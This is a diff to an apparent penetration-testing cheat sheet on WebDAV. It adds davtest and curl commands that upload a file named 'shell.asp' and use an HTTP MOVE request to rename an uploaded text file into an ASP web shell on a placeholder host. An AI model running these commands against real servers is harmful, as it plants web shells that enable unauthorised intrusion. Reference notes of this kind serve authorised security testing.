@@ -103,7 +103,10 @@ nmap --script http-webdav-scan -p80,8080 <target>
 
 * davtest
 ```davtest
-davtest -url http://localhost/davdir
+davtest -url http://host/davdir
+
+davtest -url http://host/ -uploadfile 'shell.asp' -uploadloc shell.txt
+curl -X MOVE --header 'Destination:http://host/shell.asp' 'http://host/test.txt'
 ```
 
 * cadavaer
